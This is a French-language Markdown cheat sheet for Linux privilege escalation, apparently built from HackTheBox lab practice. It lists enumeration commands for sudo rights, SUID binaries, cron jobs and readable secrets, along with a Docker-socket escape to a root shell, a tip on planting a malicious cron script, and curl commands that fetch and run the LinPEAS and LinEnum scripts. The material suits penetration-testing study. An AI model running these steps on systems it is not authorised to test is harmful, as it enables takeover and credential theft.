# 🔐 Linux Privilege Escalation - Cheatsheet Cyber

Ce fichier regroupe les **étapes clés** et **commandes essentielles** pour identifier et exploiter des failles d’élévation de privilèges sur Linux lors d’une phase de post-exploitation.

---

## 1️⃣ Enumération de base

```
id  
```
> Affiche l'utilisateur courant et ses groupes

```
uname -a  
```
> Informations sur le noyau et la version du système

```
hostnamectl  
```
> Informations sur la machine

```
cat /etc/os-release  
```
> Détails de la distribution Linux

```
sudo -l  

exemple : 
user1@htb:~$ sudo -l
Matching Defaults entries for user1 on ng-1926558-gettingstartedprivesc-9nlkr-55fd458766-8ff79:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-1926558-gettingstartedprivesc-9nlkr-55fd458766-8ff79:
    (user2 : user2) NOPASSWD: /bin/bash

user1@htb:~$ sudo -u user2 /bin/bash

```
> Liste les commandes sudo que l'utilisateur peut exécuter sans mot de passe

```
env  
```
> Affiche les variables d’environnement (peuvent révéler des chemins ou tokens)

---

## 2️⃣ Recherche de failles liées aux permissions

> flag utile pour find : 
> -not -path "/proc/*" -not -path "/dev/*"


```
find / -perm -4000 -type f 2>/dev/null  
find / -perm -4000 -type f -exec ls -l {} 2>/dev/null \;
```
> Recherche fichiers avec le bit SUID (exécuté avec droits du propriétaire)

```
find / -perm -2000 -type f 2>/dev/null  
```
> Recherche fichiers avec le bit SGID (exécuté avec droits du groupe)
  
```
find / -type f -readable 2>/dev/null
find / -type f -writable 2>/dev/null
  
```
> penser au -d pour les repertoire 
> -maxdepth 10 Ne descend pas à plus de 10 niveaux de sous‑dossiers.
>-readable = fichier que TON utilisateur peut lire ou ecrire . 
  
```
find / -perm -o+r -type f 2>/dev/null  
find / -perm -o+w -type f 2>/dev/null

```
>-o+r = permission lecture pour "others"

>souvent intéressant pour repérer des secrets accessibles.
  
```
find / -user user 2>/dev/null  
```
>Fichiers appartenant à un utilisateur précis
  
```
find / -perm -o+x -type f 2>/dev/null  
```
>Fichiers exécutables globalement

```
ls -la /etc/passwd /etc/shadow  
```
> Vérifie les permissions sur les fichiers sensibles

```
ls -la /var/run/docker.sock  
```
> Vérifie accès au socket Docker (potentiel contournement de sécurité)

---

## 3️⃣ Vérification des configurations vulnérables

>REGARDER SI CLEF RSA EXPOSE

```
cat /etc/sudoers  
```
> Liste des règles sudo (ou utiliser sudo -l)

```
ls -la /etc/sudoers.d/  
```
> Fichiers sudoers additionnels

```
cat /etc/passwd | grep bash  
```
> Utilisateurs avec shell

```
crontab -l  
```
> Tâches cron de l’utilisateur

```
cat /etc/crontab  
```
> Tâches cron système

```
ls -la /tmp /var/tmp /dev/shm  
```
> Dossiers temporaires avec possibles permissions dangereuses

---

## 4️⃣ Exploitation de failles classiques

### Exécution de commandes en tant que root via sudo

```
sudo commande  
```
> Si sudo -l montre des commandes sans mot de passe, les exécuter

### Fichiers SUID vulnérables

```
./vuln_suid_binary  
```
> Exploiter un binaire SUID mal configuré pour obtenir un shell root

### Exploitation via crontab

Ajouter un script malveillant dans un dossier accessible par cron si possible

### Exploitation Docker (si accès socket)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
```
> Obtenir un shell root via conteneur Docker

---

## 5️⃣ Outils automatisés d’élévation

### LinPEAS

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh  
```
> Audit complet et automatique des failles

### LinEnum

```
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh  
chmod +x LinEnum.sh  
./LinEnum.sh  
```
> Script d’énumération pour trouver failles classiques

---

## 6️⃣ Techniques avancées

- Exploiter les variables PATH mal configurées  
- Analyser les fichiers bash_history ou zsh_history  
- Vérifier les bibliothèques LD_PRELOAD/Ld_LIBRARY_PATH  
- Rechercher les mots de passe ou clés SSH dans des fichiers accessibles  
- Vérifier les processus en cours avec privilèges élevés

---

## 📌 Ressources utiles

- https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-privilege-escalation  
- https://gtfobins.github.io/  
- https://github.com/carlospolop/PEASS-ng  
- https://github.com/rebootuser/LinEnum  
